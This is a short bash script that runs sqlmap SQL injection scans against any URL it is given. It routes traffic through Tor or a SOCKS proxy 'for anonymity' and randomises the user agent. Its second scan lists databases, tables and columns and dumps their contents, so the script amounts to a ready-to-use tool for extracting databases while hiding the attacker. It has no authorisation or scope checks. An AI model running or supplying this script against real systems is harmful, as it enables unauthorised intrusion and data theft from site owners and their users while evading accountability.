#!/bin/bash
# SQL injection testing script with anonymity
# Usage: ./sqli_test.sh <url> [proxy]

if [ $# -eq 0 ]; then
    echo "Usage: $0 <url> [proxy]"
    echo "Examples:"
    echo "  $0 http://target.com"
    echo "  $0 http://target.com --tor"
    echo "  $0 http://target.com --proxy=socks5://127.0.0.1:9050"
    exit 1
fi

URL=$1
PROXY_ARG=""

if [ "$2" = "--tor" ]; then
    PROXY_ARG="--tor"
    echo "[+] Using Tor for anonymity"
elif [[ "$2" == --proxy=* ]]; then
    PROXY_ARG="$2"
    echo "[+] Using custom proxy: ${2#--proxy=}"
fi

echo "[+] Testing SQL injection on $URL"

# Basic SQLMap scan with proxy
sqlmap -u "$URL" --batch --banner --dbs $PROXY_ARG --random-agent

# Advanced SQLMap scan with proxy
sqlmap -u "$URL" --batch --banner --dbs --tables --columns --dump $PROXY_ARG --random-agent

echo "[+] SQL injection testing complete"
